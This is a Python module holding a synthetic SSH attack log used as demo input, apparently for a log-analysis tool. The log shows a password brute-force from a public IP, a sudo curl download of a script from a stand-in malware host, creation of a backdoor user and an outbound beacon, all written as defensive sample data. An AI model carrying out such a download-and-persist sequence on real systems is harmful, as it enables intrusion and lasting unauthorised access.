"""A built-in sample log for --demo: a small SSH brute-force + follow-on activity."""

# Attacker IP 45.133.1.90 is a routable public address so the demo shows the
# external/internal split; 10.0.0.5 is an internal host.
DEMO_LOG = """\
Nov  1 09:58:01 web01 sshd[2001]: Failed password for invalid user admin from 45.133.1.90 port 51000 ssh2
Nov  1 09:58:03 web01 sshd[2002]: Failed password for invalid user admin from 45.133.1.90 port 51002 ssh2
Nov  1 09:58:05 web01 sshd[2003]: Failed password for root from 45.133.1.90 port 51004 ssh2
Nov  1 09:58:07 web01 sshd[2004]: Failed password for root from 45.133.1.90 port 51006 ssh2
Nov  1 09:58:09 web01 sshd[2005]: Failed password for root from 45.133.1.90 port 51008 ssh2
Nov  1 09:58:20 web01 sshd[2010]: Accepted password for deploy from 45.133.1.90 port 51020 ssh2
Nov  1 09:58:25 web01 sudo[2011]:   deploy : COMMAND=/usr/bin/curl http://malware-drop.example.com/x.sh
Nov  1 09:58:26 web01 bash[2012]: downloaded payload sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Nov  1 09:58:40 web01 useradd[2013]: new user: svc-backup created
Nov  1 09:59:00 web01 app[2020]: outbound connection to 185.220.101.47:443 established
2026-11-01T09:59:30Z web01 app: internal health check from 10.0.0.5 ok
"""
